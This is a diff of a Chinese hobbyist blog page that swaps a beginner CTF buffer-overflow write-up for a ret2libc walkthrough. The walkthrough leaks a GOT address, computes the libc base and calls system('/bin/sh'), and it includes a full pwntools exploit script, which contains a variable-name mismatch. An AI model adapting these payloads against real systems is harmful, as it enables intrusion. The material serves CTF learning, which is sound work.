@@ -24,30 +24,27 @@
     var CONFIG = {"hostname":"mark0519.github.io","root":"/","scheme":"Pisces","version":"8.0.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
   </script>
 
-  <meta name="description" content="我的第一道pwn题（其实就是一道pwn的最最最最基础的题目，只是这是渣渣第一次做掉pwn，我觉得有必要纪念一下QAQ） （而且还是对着writeup做的QAQ）">
+  <meta name="description" content="pwn-libc在众多ROP方法中，重点是要找到system函数的地址来进行ROP，而有的elf源文件中并没有system函数，这是就可以利用libc system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。 即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。 所以如果我们知道 libc 中某个函数的地址，那么我们就可">
 <meta property="og:type" content="article">
-<meta property="og:title" content="第一道pwn题">
-<meta property="og:url" content="https://mark0519.github.io/2020/11/18/my-first-pwn/index.html">
+<meta property="og:title" content="pwn-libc">
+<meta property="og:url" content="https://mark0519.github.io/2021/01/21/pwn-libc/index.html">
 <meta property="og:site_name" content="mark0519的博客">
-<meta property="og:description" content="我的第一道pwn题（其实就是一道pwn的最最最最基础的题目，只是这是渣渣第一次做掉pwn，我觉得有必要纪念一下QAQ） （而且还是对着writeup做的QAQ）">
+<meta property="og:description" content="pwn-libc在众多ROP方法中，重点是要找到system函数的地址来进行ROP，而有的elf源文件中并没有system函数，这是就可以利用libc system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。 即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。 所以如果我们知道 libc 中某个函数的地址，那么我们就可">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/8a1cb1fa1a28c6c5dd193259f683e769c97516e7.png">
-<meta property="og:image" content="https://s3.ax1x.com/2020/11/18/Dn29nP.png">
-<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/f70c3615aba90b4884ace2cd6cd0079d29c33303.png">
-<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/bbfc53a150c24563a41bcd6305e2bd93c3263541.png">
-<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/4aa515d74692eadb5d124b8c2223f0e9a675178a.png">
-<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/a795084c872b178bdc9f1a8af75fcb8b1f5f49b1.png">
-<meta property="article:published_time" content="2020-11-18T14:12:37.000Z">
-<meta property="article:modified_time" content="2020-11-18T15:36:45.993Z">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/18f4dd2967c898314a3d79a7069a23c91b491c7d.png">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/edaf04621f07afcf30213dc71792080b2bc436c6.png">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/c9c5e372d6870c9dbdf6c9c0b93913f8da086ad2.png">
+<meta property="article:published_time" content="2021-01-21T14:39:33.000Z">
+<meta property="article:modified_time" content="2021-01-21T15:02:42.555Z">
 <meta property="article:author" content="mark0519">
 <meta property="article:tag" content="pwn">
 <meta property="article:tag" content="python2">
 <meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/8a1cb1fa1a28c6c5dd193259f683e769c97516e7.png">
+<meta name="twitter:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/18f4dd2967c898314a3d79a7069a23c91b491c7d.png">
 
 
-<link rel="canonical" href="https://mark0519.github.io/2020/11/18/my-first-pwn/">
+<link rel="canonical" href="https://mark0519.github.io/2021/01/21/pwn-libc/">
 
 
 <script class="page-configurations">
@@ -60,7 +57,7 @@
   };
 </script>
 
-  <title>第一道pwn题 | mark0519的博客</title>
+  <title>pwn-libc | mark0519的博客</title>
   
 
 
@@ -188,7 +185,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <section class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E9%81%93pwn%E9%A2%98"><span class="nav-number">1.</span> <span class="nav-text">我的第一道pwn题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE"><span class="nav-number">1.1.</span> <span class="nav-text">题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%A3%E6%B8%A3%E8%87%AA%E5%B7%B1%E5%86%99%E7%9A%84wp"><span class="nav-number">1.2.</span> <span class="nav-text">渣渣自己写的wp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B3%E4%BA%8Epayload"><span class="nav-number">1.3.</span> <span class="nav-text">关于payload</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn-libc"><span class="nav-number">1.</span> <span class="nav-text">pwn-libc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ctfWiki-ret2libc3"><span class="nav-number">1.1.</span> <span class="nav-text">ctfWiki  ret2libc3</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">1.1.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">1.1.2.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></li></ol></div>
         </section>
         <!--/noindex-->
 
@@ -257,7 +254,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://mark0519.github.io/2020/11/18/my-first-pwn/">
+    <link itemprop="mainEntityOfPage" href="https://mark0519.github.io/2021/01/21/pwn-libc/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -270,7 +267,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          第一道pwn题
+          pwn-libc
         </h1>
 
         <div class="post-meta-container">
@@ -282,7 +279,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2020-11-18 22:12:37 / 修改时间：23:36:45" itemprop="dateCreated datePublished" datetime="2020-11-18T22:12:37+08:00">2020-11-18</time>
+      <time title="创建时间：2021-01-21 22:39:33 / 修改时间：23:02:42" itemprop="dateCreated datePublished" datetime="2021-01-21T22:39:33+08:00">2021-01-21</time>
     </span>
 
   
@@ -295,39 +292,45 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h1 id="我的第一道pwn题"><a href="#我的第一道pwn题" class="headerlink" title="我的第一道pwn题"></a>我的第一道pwn题</h1><p>（其实就是一道pwn的最最最最基础的题目，只是这是渣渣第一次做掉pwn，我觉得有必要纪念一下QAQ）</p>
-<p>（而且还是对着writeup做的QAQ）</p>
+        <h1 id="pwn-libc"><a href="#pwn-libc" class="headerlink" title="pwn-libc"></a>pwn-libc</h1><p>在众多ROP方法中，重点是要找到system函数的地址来进行ROP，而有的elf源文件中并没有system函数，这是就可以利用libc</p>
+<p>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</p>
+<p>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。</p>
+<p>所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。</p>
+<p>为了得到libc中某函数的地址，多数采用 got 表泄露，即输出某个函数对应的 got 表项的内容。</p>
+<p><strong>当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong></p>
 <a id="more"></a>
 
-<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/8a1cb1fa1a28c6c5dd193259f683e769c97516e7.png"></p>
-<p>攻防世界原链接：<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=pwn&amp;number=2&amp;grade=0&amp;id=5052&amp;page=1">https://adworld.xctf.org.cn/task/answer?type=pwn&amp;number=2&amp;grade=0&amp;id=5052&amp;page=1</a></p>
-<h2 id="渣渣自己写的wp"><a href="#渣渣自己写的wp" class="headerlink" title="渣渣自己写的wp"></a>渣渣自己写的wp</h2><p>先用file命令查看查看附件的位数（64or32）</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file asd    <span class="comment">//ELF附件的名字叫asd</span></span><br></pre></td></tr></table></figure>
+<h2 id="ctfWiki-ret2libc3"><a href="#ctfWiki-ret2libc3" class="headerlink" title="ctfWiki  ret2libc3"></a>ctfWiki  ret2libc3</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>先分析保护</p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/18f4dd2967c898314a3d79a7069a23c91b491c7d.png"></p>
+<p>反汇编</p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/edaf04621f07afcf30213dc71792080b2bc436c6.png"></p>
+<p>可以看出，源程序仍旧开启了堆栈不可执行保护。进而查看源码，发现程序的 bug 仍然是栈溢出</p>
+<p>此外，在得到 libc 之后，其实 libc 中也是有 /bin/sh 字符串的，所以我们可以一起获得 /bin/sh 字符串的地址。</p>
+<p>这里我们泄露 __libc_start_main 的地址，这是因为它是程序最初被执行的地方。基本利用思路如下</p>
+<ul>
+<li>泄露 __libc_start_main 地址</li>
+<li>获取 libc 版本</li>
+<li>获取 system 地址与 /bin/sh 的地址</li>
+<li>再次执行源程序</li>
+<li>触发栈溢出执行 system(‘/bin/sh’)</li>
+</ul>
+<p>下面逐步分析</p>
+<p>首先利用程序中的puts函数可以打印我们需要的东西，且puts也是程序必然会使用的函数，即我们可以利用泄露puts的地址来计算system函数的地址。</p>
+<p>故利用gets函数的栈溢出漏洞，覆盖gets函数的返回地址为puts，puts的返回地址为_start函数（因为我们需要执行程序两次，第一次泄露libc，第二次执行ROP），puts的参数为puts函数的got表</p>
+<p>通过gdb调试得知需要覆盖112个字符（含ebp）</p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/c9c5e372d6870c9dbdf6c9c0b93913f8da086ad2.png"></p>
+<p>则得出payload1</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">&quot;zbrnb&quot;</span>.ljust(<span class="number">112</span>,<span class="string">&#x27;a&#x27;</span>)  + p32(puts_plt) + p32(start_addr) + p32(puts_got)</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://s3.ax1x.com/2020/11/18/Dn29nP.png"></p>
-<p>可以看到是64位程序，使用64位的IDA打开</p>
-<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/f70c3615aba90b4884ace2cd6cd0079d29c33303.png"></p>
-<p>这里可以看到程序里有一个read函数，一个if判断，且当if为真时调用sub_400686函数</p>
-<p>进入sub_400686函数查看具体内容：</p>
-<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/bbfc53a150c24563a41bcd6305e2bd93c3263541.png"></p>
-<p>即调用 cat flag.txt</p>
-<p>故为了获得flag，我们需要时main函数中的if条件为真，即</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dword_60106C == <span class="number">1853186401</span></span><br></pre></td></tr></table></figure>
+<p>之后程序便会打印出puts的got表，使用u32解包</p>
+<p>之后libc.address即为得到的地址减去libc.symbols[‘puts’]</p>
+<p>即得到payload2</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2 = <span class="string">&quot;zbrnb&quot;</span>.ljust(<span class="number">112</span>,<span class="string">&#x27;b&#x27;</span>) + p32(system_addr) + <span class="string">&#x27;aaaa&#x27;</span> + p32(binsh_addr)</span><br></pre></td></tr></table></figure>
 
-<p>而read函数会把输入的值赋值给unk，而我们需要改变dword的值，故需要利用栈溢出原理</p>
-<p>这里查看unk和dword的具体地址</p>
-<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/4aa515d74692eadb5d124b8c2223f0e9a675178a.png"></p>
-<p>即发现unk到dword之间偏移量为4，构造exp：</p>
-<p>（随后具体介绍exp是个啥）</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *                    //调用pwntools</span><br><span class="line">r=remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">40702</span>)     //连接题目服务器，remote(<span class="string">&#x27;ip地址&#x27;</span>，端口)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>)     //构造输入的值，具体下文介绍       </span><br><span class="line">r.recvuntil(<span class="string">&quot;lets get helloworld for bof&quot;</span>)  //recvuntil(<span class="built_in">str</span>)：接收到第一次出现<span class="built_in">str</span>的内容为止</span><br><span class="line">r.sendline(payload)                  //发送之前构造的payload    </span><br><span class="line"><span class="built_in">print</span> r.recv()                       //recv()：接受收到的所有字符</span><br><span class="line"><span class="built_in">print</span> r.recv()</span><br></pre></td></tr></table></figure>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;zbrnb&quot;</span>.ljust(<span class="number">112</span>,<span class="string">&#x27;a&#x27;</span>)  + p32(puts_plt) + p32(start_addr) + p32(puts_got)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Can you find it !?&quot;</span>, payload1)</span><br><span class="line">puts_addr = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&quot;zbrnb&quot;</span>.ljust(<span class="number">112</span>,<span class="string">&#x27;b&#x27;</span>) + p32(system_addr) + <span class="string">&#x27;aaaa&#x27;</span> + p32(binsh_addr)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
-<p>运行exp</p>
-<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/a795084c872b178bdc9f1a8af75fcb8b1f5f49b1.png"></p>
-<p>得到flag！！</p>
-<h2 id="关于payload"><a href="#关于payload" class="headerlink" title="关于payload"></a>关于payload</h2><p>上文的payload具体为：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>)</span><br></pre></td></tr></table></figure>
 
-<p>由于unk和dword之间的<strong>偏移量为4</strong>，故填充4个‘a’，然后在填充数字1853186401，由于程序是64位的，故将数字进行p64()打包</p>
+
 
     </div>
 
@@ -345,7 +348,7 @@
   </li>
   <li class="post-copyright-link">
       <strong>本文链接：</strong>
-      <a href="https://mark0519.github.io/2020/11/18/my-first-pwn/" title="第一道pwn题">https://mark0519.github.io/2020/11/18/my-first-pwn/</a>
+      <a href="https://mark0519.github.io/2021/01/21/pwn-libc/" title="pwn-libc">https://mark0519.github.io/2021/01/21/pwn-libc/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -363,14 +366,11 @@
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2020/11/12/C%E8%AF%AD%E8%A8%80%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/" rel="prev" title="C语言文件读写">
-                  <i class="fa fa-chevron-left"></i> C语言文件读写
+                <a href="/2021/01/15/pwn-shellcode/" rel="prev" title="pwn-shellcode">
+                  <i class="fa fa-chevron-left"></i> pwn-shellcode
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2020/11/18/pwn-learn-exp/" rel="next" title="pwn学习-exp">
-                  pwn学习-exp <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
     </footer>
